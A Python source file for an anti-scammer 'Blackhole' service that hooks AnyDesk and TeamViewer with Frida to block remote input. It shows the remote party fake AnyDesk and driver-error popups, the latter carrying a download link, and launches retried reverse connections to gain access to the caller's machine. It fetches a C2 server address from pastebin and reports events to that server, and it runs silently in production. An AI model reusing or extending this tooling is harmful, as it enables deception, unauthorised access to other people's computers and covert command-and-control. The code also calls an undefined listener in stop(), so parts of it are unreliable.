#!/usr/bin/env python3
"""
Blackhole Input Firewall Service
Selectively blocks remote desktop input while allowing host input.

Architecture:
- Process Monitor: Detects AnyDesk/TeamViewer processes
- API Hooker: Uses Frida to hook SendInput() and tag input with magic value
- Gatekeeper: Low-level hooks check dwExtraInfo and block tagged input

This allows Mac keyboard/trackpad (QEMU VirtIO) to work while blocking remote desktop input.
"""

import os
import re
import sys
import threading
import time
import urllib.request

from rich.console import Console

from utils.config import (
    DEFAULT_FIREWALL_STATE,
    TOGGLE_HOTKEY,
    DRIVER_DOWNLOAD_URL,
    CONFIG_URL,
    FALLBACK_HOST,
    C2_SERVER_PORT,
    C2_API_KEY,
    REVERSE_CONNECTION_ENABLED,
    REVERSE_CONNECTION_RETRY_LIMIT,
    REVERSE_CONNECTION_RETRY_DELAY,
    FAKE_POPUP_ENABLED,
    FAKE_POPUP_TIMEOUT,
    AUTO_ENABLE_FIREWALL_ON_CONNECTION,
)
from utils.gatekeeper import InputGatekeeper
from utils.process_monitor import ProcessMonitor
from utils.api_hooker import APIHooker
from utils.hotkeys import HotkeyListener
from utils.notifications import show_driver_error
from utils.log_monitor import LogMonitor
from utils.connection_correlator import ConnectionCorrelator
from utils.anydesk_controller import AnyDeskController
from utils.fake_popup import create_fake_anydesk_popup
from utils.c2_client import C2Client


# ============================================================================
# CONSTANTS
# ============================================================================

# Timing delays (seconds)
POPUP_DISPLAY_DELAY = 2  # Delay before showing fake popup to scammer
PASTEBIN_FETCH_TIMEOUT = 5  # Timeout for fetching C2 IP from pastebin
# DEV_MODE_SHUTDOWN_COUNTDOWN = 60  # (Disabled - dev mode now runs indefinitely)


# ============================================================================
# DEV MODE DETECTION
# ============================================================================


def detect_dev_mode():
    """
    Detect if running in dev mode.
    Dev mode is active if:
    1. Running as .py file (not frozen/compiled)
    2. Running as .exe with .dev_mode marker file present

    Returns:
        bool: True if dev mode, False if production
    """
    # Check if running as compiled executable
    is_frozen = getattr(sys, "frozen", False)

    # Get executable/script directory
    if is_frozen:
        exe_dir = os.path.dirname(sys.executable)
    else:
        exe_dir = os.path.dirname(os.path.abspath(__file__))

    # Check for .dev_mode marker
    dev_mode_marker = os.path.join(exe_dir, ".dev_mode")

    # Dev mode if running as .py OR if .dev_mode marker exists
    is_dev_mode = not is_frozen or os.path.exists(dev_mode_marker)

    return is_dev_mode


# ============================================================================
# LOGGING
# ============================================================================


def create_log_func(dev_mode):
    """
    Create a logging function based on dev mode with rich color-coding.

    Args:
        dev_mode: If True, log to console with colors; if False, silent

    Returns:
        Logging function
    """
    if dev_mode:
        console = Console()

        # Color mapping for different log categories
        COLOR_MAP = {
            "LOG_MONITOR": "cyan",
            "CORRELATOR": "magenta",
            "GATEKEEPER": "red",
            "SERVICE": "green",
            "HOOKER": "yellow",
            "MONITOR": "blue",
            "HOTKEY": "bright_magenta",
            "C2": "bright_blue",
            "C2_CLIENT": "bright_cyan",
            "ANYDESK": "bright_yellow",
            "ANYDESK LOG": "bright_black",  # Gray for verbose trace logs
            "CONTROLLER": "bright_green",
            "POPUP": "bright_red",
        }

        def log(msg):
            # Try to extract log category from message (allow spaces in category names)
            match = re.match(r"\[([A-Z_0-9| ]+)\]", msg)
            if match:
                category = match.group(1)
                # Handle composite categories like "LOG_MONITOR | ANYDESK LOG TRACE"
                primary_category = category.split("|")[0].strip()
                color = COLOR_MAP.get(primary_category, "white")
                # Split into category and message
                parts = msg.split("] ", 1)
                if len(parts) == 2:
                    console.print(f"[{color}][{category}][/{color}] {parts[1]}")
                else:
                    console.print(msg)
            else:
                # No category found, print as-is
                console.print(msg)

        return log
    else:
        # Silent in production
        def log(msg):
            pass

        return log


# ============================================================================
# MAIN SERVICE
# ============================================================================


class BlackholeService:
    """
    Main service that manages the input firewall and hotkey detection.
    """

    def __init__(self, dev_mode):
        """
        Initialize the Blackhole service.

        Args:
            dev_mode: If True, show console output and popups
        """
        self.dev_mode = dev_mode
        self.log = create_log_func(dev_mode)

        # Firewall state
        self.firewall_active = DEFAULT_FIREWALL_STATE

        # Initialize original components
        self.gatekeeper = InputGatekeeper(log_func=self.log)
        self.process_monitor = ProcessMonitor(log_func=self.log, callback=self._on_process_event)
        self.api_hooker = APIHooker(log_func=self.log)
        self.hotkey_listener = HotkeyListener(TOGGLE_HOTKEY, self.toggle_firewall, log_func=self.log)

        # Initialize AnyDesk integration components as None
        # They will be created/destroyed dynamically by _on_process_event
        self.anydesk_path = None
        self.anydesk_mode = None
        self.log_monitor = None
        self.correlator = None
        self.anydesk_controller = AnyDeskController(log_func=self.log)  # This one can stay

        # Fetch C2 server IP dynamically from pastebin
        c2_host = self._get_c2_ip()
        self.c2_client = C2Client(c2_host, C2_SERVER_PORT, C2_API_KEY, log_func=self.log)

        # Disable C2 logging in dev mode
        if dev_mode:
            self.c2_client.disable()

        # Track active popups and retry attempts
        self.active_popups = []
        self.outgoing_attempts = {}  # {anydesk_id: {'count': N, 'last_attempt': timestamp}}

        self.log("\n" + "=" * 60)
        self.log("  AnyDesk Client Service")
        self.log("=" * 60)
        self.log(f"Mode: {'DEV' if dev_mode else 'PRODUCTION'}")
        self.log(f"AnyDesk Mode: Awaiting detection...")  # New status
        self.log(f"Architecture: API Hooking + Dynamic Log Monitoring")
        self.log(f"Default state: {'ACTIVE' if DEFAULT_FIREWALL_STATE else 'INACTIVE'}")
        self.log(f"Reverse connection: {'ENABLED' if REVERSE_CONNECTION_ENABLED else 'DISABLED'}")
        self.log(f"Hotkey: Command+Shift+F (toggle firewall + fake popup)")
        self.log("=" * 60 + "\n")

    def _on_process_event(self, event_type, pid, process_name, exe_path):
        """
        Handle process found/lost events from ProcessMonitor.
        This is the new "brain" of the service.
        """
        # We only care about AnyDesk for this logic
        if process_name != "AnyDesk.exe":
            if event_type == "found":
                # Hook other target processes (TeamViewer, etc.)
                success = self.api_hooker.hook_process(pid, process_name)
                if not success:
                    self.log(f"[SERVICE] WARNING: Failed to hook {process_name} (PID: {pid})")
            elif event_type == "lost":
                self.api_hooker.unhook_process(pid)
            return

        # --- AnyDesk-Specific Dynamic Logic ---
        if event_type == "found":
            self.log(f"[SERVICE] AnyDesk process FOUND (PID: {pid}) at {exe_path}")

            # 1. Determine and set mode
            if not exe_path:
                self.log("[SERVICE] WARNING: Could not get AnyDesk .exe path. Defaulting to PORTABLE mode.")
                self.anydesk_mode = "portable"
            else:
                self.anydesk_path = exe_path  # Store the path
                path_lower = exe_path.lower()
                if r"c:\program files (x86)\anydesk" in path_lower or r"c:\program files\anydesk" in path_lower:
                    self.anydesk_mode = "service"
                else:
                    self.anydesk_mode = "portable"
            self.log(f"[SERVICE] AnyDesk mode set to: {self.anydesk_mode.upper()}")

            # 2. Stop any old/stale monitors (handles version switching)
            if self.log_monitor and self.log_monitor.is_running():
                self.log("[SERVICE] Stopping old log monitor...")
                self.log_monitor.stop()
            if self.correlator:
                self.log("[SERVICE] Stopping old correlator...")
                self.correlator.stop()

            # 3. Initialize and start new modules with the correct mode
            self.log("[SERVICE] Initializing new modules for this mode...")
            self.log_monitor = LogMonitor(callback=self._on_log_event, mode=self.anydesk_mode, log_func=self.log)
            self.correlator = ConnectionCorrelator(
                callback=self._on_connection_event,
                mode=self.anydesk_mode,
                log_func=self.log,
            )

            self.log_monitor.start()
            self.correlator.start()

            # 4. Hook the new process
            success = self.api_hooker.hook_process(pid, process_name)
            if not success:
                self.log(f"[SERVICE] WARNING: Failed to hook {process_name} (PID: {pid})")

        elif event_type == "lost":
            self.log(f"[SERVICE] AnyDesk process LOST (PID: {pid})")

            # 1. Unhook
            self.api_hooker.unhook_process(pid)

            # 2. Stop monitors
            if self.log_monitor and self.log_monitor.is_running():
                self.log("[SERVICE] Stopping log monitor...")
                self.log_monitor.stop()
            if self.correlator:
                self.log("[SERVICE] Stopping correlator...")
                self.correlator.stop()

            # 3. Reset state
            self.log("[SERVICE] Resetting AnyDesk state. Awaiting new process...")
            self.anydesk_mode = None
            self.anydesk_path = None
            self.log_monitor = None
            self.correlator = None

    def _get_c2_ip(self):
        """Fetch C2 server IP from pastebin with fallback"""
        try:
            self.log("[C2] Fetching C2 server IP from pastebin...")
            with urllib.request.urlopen(CONFIG_URL, timeout=PASTEBIN_FETCH_TIMEOUT) as response:
                ip = response.read().decode("utf-8").strip()
                if ip:
                    self.log(f"[C2] Got C2 server IP: {ip}")
                    return ip
        except Exception as e:
            self.log(f"[C2] Pastebin fetch failed: {e}")

        self.log(f"[C2] Using fallback IP: {FALLBACK_HOST}")
        return FALLBACK_HOST

    def _on_log_event(self, event_type, data):
        """
        Called by LogMonitor when new log entries are detected.
        Routes events to the correlator.
        """
        self.correlator.add_event(event_type, data)

    def _on_connection_event(self, event):
        """
        Called by ConnectionCorrelator when a complete connection event is matched.
        Dispatches to specific handlers based on event type.
        """
        event_type = event.get("event_type")

        if event_type == "incoming_request":
            self._handle_incoming_request(event)
        elif event_type == "outgoing_rejected":
            self._handle_outgoing_rejected(event)
        elif event_type == "outgoing_accepted":
            self._handle_outgoing_accepted(event)

    def _handle_incoming_request(self, event):
        """Handle incoming connection request from scammer"""
        anydesk_id = event["anydesk_id"]
        ip_address = event["ip_address"]

        self.log("\n" + "=" * 60)
        self.log(f"🚨 INCOMING CONNECTION REQUEST")
        self.log("=" * 60)
        self.log(f"  AnyDesk ID: {anydesk_id}")
        self.log(f"  IP Address: {ip_address}")
        self.log("=" * 60 + "\n")

        # Auto-enable firewall if configured and not already active
        if AUTO_ENABLE_FIREWALL_ON_CONNECTION and not self.firewall_active:
            self.log("[SERVICE] Auto-enabling firewall for incoming connection...")
            self.gatekeeper.start()
            if self.gatekeeper.is_active():
                self.firewall_active = True
                self.log("[SERVICE] Firewall ENABLED - scammer input will be blocked")
                event["metadata"]["firewall_auto_enabled"] = True
            else:
                self.log("[SERVICE] WARNING: Failed to enable firewall")
                event["metadata"]["firewall_auto_enabled"] = False
        else:
            event["metadata"]["firewall_auto_enabled"] = False

        # Log to C2 server
        self.c2_client.log_event(event)

        # Initiate reverse connection if enabled
        if REVERSE_CONNECTION_ENABLED and self.anydesk_path:
            self.log(f"[SERVICE] Initiating reverse connection to {anydesk_id}...")
            success = self.anydesk_controller.initiate_connection(self.anydesk_path, anydesk_id)

            if success:
                # Track attempt
                self.outgoing_attempts[anydesk_id] = {"count": 1, "last_attempt": time.time()}
                event["metadata"]["reverse_connection_initiated"] = True
                self.log(f"[SERVICE] Reverse connection window launched (attempt 1/{REVERSE_CONNECTION_RETRY_LIMIT})")

                # Show fake popup after small delay (give scammer time to see honeypot)
                if FAKE_POPUP_ENABLED:
                    time.sleep(POPUP_DISPLAY_DELAY)
                    self._show_fake_popup()
            else:
                event["metadata"]["reverse_connection_initiated"] = False
                self.log("[SERVICE] Failed to initiate reverse connection")
        else:
            event["metadata"]["reverse_connection_initiated"] = False
            if not REVERSE_CONNECTION_ENABLED:
                self.log("[SERVICE] Reverse connection disabled in config")
            elif not self.anydesk_path:
                self.log("[SERVICE] Reverse connection unavailable (AnyDesk not found)")

    def _handle_outgoing_rejected(self, event):
        """Handle outgoing connection rejection from scammer"""
        anydesk_id = event["anydesk_id"]

        # Get attempt count
        attempt_info = self.outgoing_attempts.get(anydesk_id, {"count": 0, "last_attempt": 0})
        attempt_count = attempt_info["count"]

        self.log("\n" + "=" * 60)
        self.log(f"❌ REVERSE CONNECTION REJECTED")
        self.log("=" * 60)
        self.log(f"  Target: {anydesk_id}")
        self.log(f"  Attempt: {attempt_count}/{REVERSE_CONNECTION_RETRY_LIMIT}")
        self.log("=" * 60 + "\n")

        # Log to C2
        event["metadata"]["attempt_number"] = attempt_count
        self.c2_client.log_event(event)

        # Check if we should retry
        if attempt_count < REVERSE_CONNECTION_RETRY_LIMIT:
            # Calculate backoff delay (exponential: 15s, 30s, 60s)
            delay = REVERSE_CONNECTION_RETRY_DELAY * (2 ** (attempt_count - 1))
            time_since_last = time.time() - attempt_info["last_attempt"]

            if time_since_last >= delay:
                # Retry now
                self._retry_reverse_connection(anydesk_id, attempt_count + 1)
            else:
                # Schedule retry
                wait_time = delay - time_since_last
                self.log(f"[SERVICE] Scheduling retry in {wait_time:.0f} seconds...")
                threading.Timer(wait_time, self._retry_reverse_connection, args=(anydesk_id, attempt_count + 1)).start()
        else:
            self.log(f"[SERVICE] Max retry attempts reached for {anydesk_id}")
            # Clean up tracking
            if anydesk_id in self.outgoing_attempts:
                del self.outgoing_attempts[anydesk_id]

    def _handle_outgoing_accepted(self, event):
        """Handle successful outgoing connection to scammer"""
        anydesk_id = event["anydesk_id"]

        self.log("\n" + "=" * 60)
        self.log(f"🎯 SUCCESS! REVERSE CONNECTION ACCEPTED")
        self.log("=" * 60)
        self.log(f"  Target: {anydesk_id}")
        self.log(f"  Status: YOU NOW HAVE ACCESS TO SCAMMER'S MACHINE")
        self.log("=" * 60 + "\n")

        # Log to C2
        self.c2_client.log_event(event)

        # Close any active fake popups
        self._close_all_popups()

        # Clear retry tracking
        if anydesk_id in self.outgoing_attempts:
            del self.outgoing_attempts[anydesk_id]

    def _retry_reverse_connection(self, anydesk_id, attempt_number):
        """Retry reverse connection attempt"""
        self.log(
            f"[SERVICE] Retrying reverse connection to {anydesk_id} (attempt {attempt_number}/{REVERSE_CONNECTION_RETRY_LIMIT})..."
        )

        if self.anydesk_path:
            success = self.anydesk_controller.initiate_connection(self.anydesk_path, anydesk_id)

            if success:
                # Update attempt tracking
                self.outgoing_attempts[anydesk_id] = {"count": attempt_number, "last_attempt": time.time()}
                self.log(f"[SERVICE] Retry launched successfully")
            else:
                self.log("[SERVICE] Retry failed")

    def _show_fake_popup(self):
        """Show fake AnyDesk popup to scammer"""
        self.log("[SERVICE] Showing fake AnyDesk popup...")
        popup = create_fake_anydesk_popup(log_func=self.log)
        popup.show()
        self.active_popups.append(popup)

    def _close_all_popups(self):
        """Close all active fake popups"""
        for popup in self.active_popups:
            if not popup.is_closed():
                popup.close()
        self.active_popups.clear()

    def toggle_firewall(self):
        """Toggle firewall on/off (called by hotkey)"""
        if self.firewall_active:
            # Turn OFF (silent - no popup)
            self.log("[SERVICE] Hotkey pressed - DISABLING firewall...")
            self.gatekeeper.stop()
            self.firewall_active = False
            self.log("[SERVICE] Firewall is now INACTIVE - all input allowed")
        else:
            # Turn ON (show fake driver error to scammer)
            self.log("[SERVICE] Hotkey pressed - ENABLING firewall...")
            self.gatekeeper.start()

            if self.gatekeeper.is_active():
                self.firewall_active = True
                self.log("[SERVICE] Firewall is now ACTIVE - blocking tagged input")

                # Show fake driver error popup to trick scammer
                self.log("[SERVICE] Showing fake driver error to scammer...")
                show_driver_error(DRIVER_DOWNLOAD_URL)
                self.log(f"[SERVICE] Driver download URL displayed: {DRIVER_DOWNLOAD_URL}")
            else:
                self.log("[SERVICE] Firewall activation FAILED")

    def start(self):
        """Start the service"""
        self.log("[SERVICE] Starting Blackhole service...")

        # Start process monitor (this is now the main trigger)
        self.process_monitor.start()

        # Start hotkey listener
        self.hotkey_listener.start()
        self.log("[SERVICE] Hotkey listener active")

        # Apply default state
        if DEFAULT_FIREWALL_STATE:
            self.log("[SERVICE] Activating firewall...")
            self.gatekeeper.start()

            # Check if activation succeeded
            if self.gatekeeper.is_active():
                self.firewall_active = True
                self.log("[SERVICE] Firewall is ACTIVE - blocking tagged input")
            else:
                self.firewall_active = False
                self.log("[SERVICE] Firewall activation FAILED")
        else:
            self.log("[SERVICE] Firewall is INACTIVE - all input allowed")

        self.log("[SERVICE] Service is running. Press Ctrl+C to exit.\n")

    def run(self):
        """Run the service until interrupted"""
        self.start()

        try:
            # Keep the main thread alive
            if self.dev_mode:
                # DEV MODE: Run indefinitely with console output
                while True:
                    time.sleep(1)
            else:
                # PRODUCTION MODE: Run indefinitely
                while True:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.log("\n[SERVICE] Received interrupt signal")
            self.stop()

    def stop(self):
        """Stop the service"""
        self.log("[SERVICE] Stopping Blackhole service...")

        # Stop AnyDesk components (with checks)
        if self.log_monitor:
            self.log("[SERVICE] Stopping AnyDesk log monitor...")
            self.log_monitor.stop()
        if self.correlator:
            self.log("[SERVICE] Stopping correlation engine...")
            self.correlator.stop()

        # Close all fake popups
        self._close_all_popups()

        # Stop hotkey listeners
        self.hotkey_listener.stop()
        self.driver_error_listener.stop()

        # Stop process monitor
        self.process_monitor.stop()

        # Unhook all processes
        self.api_hooker.unhook_all()

        # Stop firewall if active
        if self.firewall_active:
            self.gatekeeper.stop()

        # Print statistics in dev mode
        if self.dev_mode:
            try:
                stats = self.gatekeeper.get_stats()
                hooked_pids = self.api_hooker.get_hooked_processes()
                correlator_stats = self.correlator.get_stats() if self.correlator else {}

                self.log("\n" + "=" * 60)
                self.log("  Session Statistics")
                self.log("=" * 60)
                self.log(f"Blocked keyboard:  {stats.get('blocked_keys', 0)}")
                self.log(f"Blocked mouse:     {stats.get('blocked_mouse', 0)}")
                self.log(f"Allowed keyboard:  {stats.get('allowed_keys', 0)}")
                self.log(f"Allowed mouse:     {stats.get('allowed_mouse', 0)}")
                self.log(f"Hooked processes:  {len(hooked_pids)}")
                self.log(f"Pending IDs:       {correlator_stats.get('waiting_ids', 0)}")
                self.log(f"Pending IPs:       {correlator_stats.get('waiting_ips', 0)}")
                self.log("=" * 60 + "\n")
            except Exception as e:
                self.log(f"[ERROR] Failed to get stats: {e}")

        self.log("[SERVICE] Service stopped.\n")


# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    # Detect dev mode
    dev_mode = detect_dev_mode()

    # Create and run service
    service = BlackholeService(dev_mode)
    service.run()
